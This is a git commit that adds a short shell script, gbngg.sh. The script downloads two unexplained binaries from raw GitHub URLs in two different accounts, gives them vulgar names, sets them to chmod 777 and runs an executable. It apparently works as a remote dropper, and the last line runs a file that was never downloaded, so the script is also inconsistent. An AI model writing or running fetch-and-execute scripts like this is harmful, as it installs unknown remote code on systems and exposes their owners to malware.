a1a9c1a7a3f098b8cc39fe4919a7f4501df3d831
ferasa <86012372+desafff@users.noreply.github.com>
2021-07-20 15:04:11 +0700

    Create gbngg.sh

---
+++ gbngg.sh
@@ -0,0 +1,5 @@
+#!/bin/sh
+wget -O syng https://raw.githubusercontent.com/desafff/ccm/main/faa
+wget -O kontol https://raw.githubusercontent.com/githubasem/vio/main/vio
+chmod 777 syng kontol
+./memek
